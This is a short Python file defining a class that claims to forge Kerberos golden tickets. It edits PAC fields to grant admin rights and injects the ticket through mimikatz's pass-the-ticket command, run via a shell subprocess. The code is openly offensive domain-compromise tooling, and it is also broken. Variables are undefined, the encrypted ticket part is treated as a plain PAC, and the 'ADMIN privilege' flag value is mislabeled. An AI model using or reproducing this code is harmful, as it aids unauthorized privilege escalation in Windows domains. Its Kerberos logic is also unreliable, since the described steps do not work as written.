from pyasn1.codec.der import decoder, encoder
from impacket.krb5.asn1 import TGS_REP, AP_REQ
from impacket.krb5.pac import PAC_LOGON_INFO
import subprocess
import tempfile
import os

class KerberosForge:
	def create_golden_ticket(self, domain_sid, spn="krbtgt", mimikatz_path=None):
		"""Enhanced PAC modification with pyasn1"""
		try:
			# Decode and modify PAC
			decoded_tgt = decoder.decode(tgt, asn1Spec=TGS_REP())[0]
			pac_stream = decoded_tgt['ticket']['enc-part']['cipher']
			
			# Decode PAC structure
			pac_type = decoder.decode(pac_stream, asn1Spec=PAC_LOGON_INFO())[0]
			
			# Modify PAC elements (example: set admin privileges)
			pac_type['user_flags'] = 0x00000020  # ADMIN privilege
			modified_pac = encoder.encode(pac_type)
			
			# Re-encode ticket
			decoded_tgt['ticket']['enc-part']['cipher'] = modified_pac
			
			if mimikatz_path:
				return self._mimikatz_automation(decoded_tgt)
			return encoder.encode(decoded_tgt)
			
		except Exception as e:
			self.logger.error(f"PAC modification failed: {str(e)}")

	def _mimikatz_automation(self, ticket):
		"""Integrate with real mimikatz binary"""
		with tempfile.NamedTemporaryFile(delete=False) as tmp:
			tmp.write(encoder.encode(ticket))
			tmp.close()
			cmd = f'{mimikatz_path} "kerberos::ptt {tmp.name}"'
			subprocess.run(cmd, shell=True)
			os.unlink(tmp.name)